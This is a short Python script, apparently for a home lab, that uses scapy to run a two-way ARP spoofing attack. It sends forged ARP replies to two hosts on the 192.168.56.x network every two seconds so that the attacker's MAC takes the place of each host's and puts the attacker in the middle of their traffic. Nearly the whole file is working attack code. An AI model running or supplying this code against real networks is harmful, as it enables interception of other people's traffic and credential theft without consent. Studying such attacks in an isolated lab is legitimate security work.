import scapy.all as scapy
import asyncio

class ArpSpoofing:
    def __init__(self, ip_src, ip_dst, mac_src, mac_dst, interface):
        self.ip_src = ip_src
        self.mac_src = mac_src
        self.ip_dst = ip_dst
        self.mac_dst = mac_dst
        self.interface = interface

    def spoof(self):
        # Créer un paquet ARP de type "is-at" (op=2) et l'envoyer
        # Fonctionnement à confirmer
        eth = scapy.Ether(dst=self.mac_dst, src=self.mac_src)
        arp = scapy.ARP(op=2, hwsrc=self.mac_src, psrc=self.ip_src, hwdst=self.mac_dst, pdst=self.ip_dst)
        packet = eth / arp
        print(packet.summary())
        scapy.sendp(packet, iface=self.interface, verbose=False)

    async def start_spoofing(self, interval: float = 2.0):
        """Coroutine non-bloquante : exécute la méthode bloquante self.spoof() dans
        un executor et utilise asyncio.sleep pour le délai.
        """
        loop = asyncio.get_running_loop()
        try:
            while True:
                await loop.run_in_executor(None, self.spoof)
                await asyncio.sleep(interval)
        except asyncio.CancelledError:
            print(f"Spoofing ARP interrompu pour {self.ip_dst}")
            raise
        except Exception as e:
            print("Arrêt du spoofing ARP de "+self.ip_dst+" - "+str(e))
    
    def __str__(self):
        return f"ArpSpoofing(ip_src={self.ip_src}, mac_src={self.mac_src}, ip_dst={self.ip_dst}, mac_dst={self.mac_dst}, interface={self.interface})"


async def main():
    s1 = ArpSpoofing("192.168.56.5", "192.168.56.4", "d6:61:9d:90:a2:64", "08:00:27:07:78:aa", "bridge100")
    s2 = ArpSpoofing("192.168.56.4", "192.168.56.5", "d6:61:9d:90:a2:64", "08:00:27:74:d6:4d", "bridge100")

    # Lancer les deux spoofers en parallèle
    t1 = asyncio.create_task(s1.start_spoofing(interval=2.0))
    t2 = asyncio.create_task(s2.start_spoofing(interval=2.0))
    try:
        await asyncio.gather(t1, t2)
    except asyncio.CancelledError:
        t1.cancel()
        t2.cancel()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Arrêt demandé par l'utilisateur")